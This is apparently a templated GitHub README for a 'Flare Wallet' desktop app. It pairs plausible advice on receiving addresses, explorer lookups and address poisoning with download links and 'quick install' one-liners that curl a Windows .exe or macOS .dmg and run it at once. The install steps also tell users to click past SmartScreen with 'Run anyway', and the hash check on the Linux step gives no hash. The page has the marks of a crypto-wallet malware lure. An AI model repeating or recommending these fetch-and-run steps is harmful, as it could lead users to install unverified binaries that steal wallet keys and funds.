![Flare Wallet](assets/banner-article.png)

# Flare Wallet Address: Receive, Verify and Check on Explorer

Getting an address right is a habit, not a setting.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

The address you receive on is created by the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) and lives on Flare mainnet, chain ID 14.

> An address can only receive. Losing funds takes your key or a transaction you approved, never someone knowing where you receive.

Your Flare Wallet address is the account: a string derived from your keys that other people use to send you FLR, WFLR or FXRP. It is safe to share, because it cannot spend anything. What matters is that the address you give out is the one you control, and that the one you paste into a form is the one you meant.

<!-- ARTICLE-BODY-BEGIN -->

## What an address is, and what it is not

It is a destination, not a credential. Anyone can send to it, anyone can look it up, and nobody can take from it without a signature. That is why posting it publicly is a privacy question rather than a security one.

It also belongs to a chain. The same characters can exist on other EVM networks with a different balance, so an address is only meaningful together with the network you are on. Sending FLR to an address on the wrong chain, or sending another chain's asset to a Flare address, is a mistake you undo only by controlling the same key on the destination chain.

## Receiving: the three checks before you share

1. Confirm the network: Flare mainnet, chain ID 14, if the sender is choosing one.
2. Copy the address from the wallet yourself rather than from a chat, a screenshot or an email.
3. Read the first and last six characters back to the sender, so a swap in the middle is caught.

The third check exists because clipboard malware changes an address after you copy it, and it often rewrites the middle while leaving the ends intact. Comparing the ends is what catches that.

## What an explorer lookup tells you

Paste the address into the Flare explorer and you get the balance, the transaction history and the token transfers. That view is the chain itself, which makes it the reference when a wallet disagrees with reality.

To read a transaction, paste its hash instead. You will see its status, the amount, the fee paid and whether it succeeded. A successful transaction with the right amount and the right recipient is the end of the question; a pending one is the beginning of a different one.

## When the address in the wallet looks wrong

Three causes cover it. A restore that produced a different account index will show a different address from the same phrase. A wallet on another chain shows that chain's account. And a changed clipboard shows whatever the malware chose.

Compare against the address you have written down, not against the one on screen, and check the chain before concluding anything. If the explorer shows the address you expect with the balance you expect, the funds are where they should be. Restoring into a fresh build is covered in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-not-syncing.md">Flare Wallet not syncing</a>.

## Address poisoning and the copy-paste trap

The attack works on habit. Someone sends a tiny transfer from an address that looks like one you use, so it appears in your history. Next time you copy a recipient from history, you pick theirs.

Defences are simple and boring: copy from a saved list you created, check more than the first four characters, and treat any unexpected small incoming transfer as a warning rather than spare change.

## Receiving FXRP or WFLR

Both arrive at the same address as FLR, because they are tokens on the same chain. What differs is that the wallet has to know the token to display it; an address that receives FXRP without showing it is still holding it, and the explorer will prove it. What backs FXRP is set out in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-fxrp.md">Flare Wallet FXRP</a>.

If a balance is missing after a token transfer, check the explorer before assuming a loss. Display gaps are common; chain-side reversals are not.

## FAQ

### Can someone steal my crypto with my address?

No. An address only receives. Theft requires your key material or a transaction you signed, which is why the phrase matters more than the address.

### How do I read a Flare transaction on the explorer?

Paste the transaction hash into the Flare explorer. It shows status, amount, fee and recipient; compare those against what you intended before drawing a conclusion.

### How do I know an address is mine?

It is the one your wallet shows when you unlock it, derived from the same phrase you backed up. If two installations disagree, the derivation differs and the backed-up phrase is the reference.

### Can I reuse one address?

Yes. An address is not a one-time deposit tag; it can receive as often as you like. Reusing it is normal and only costs privacy.

### What happens if I send to the wrong chain?

The funds are usually not lost, but recovering them needs a wallet on the destination chain with the same key. That is a recovery exercise, not a support request, so confirming the chain before sending is the cheaper habit. Use the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a> and check chain ID 14 before every first send.

### Why does my wallet show a different address after restoring?

Because the restore produced a different account from the same phrase, or because the wallet is on another network. Check the chain first, then the account derivation.

### Where do I get the wallet that created this address?

From the release page: <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a> and verify the tag before installing.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet not syncing](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-not-syncing.md) | [Flare Wallet network settings](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-network-settings.md) | [Flare Wallet XRP](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-xrp.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
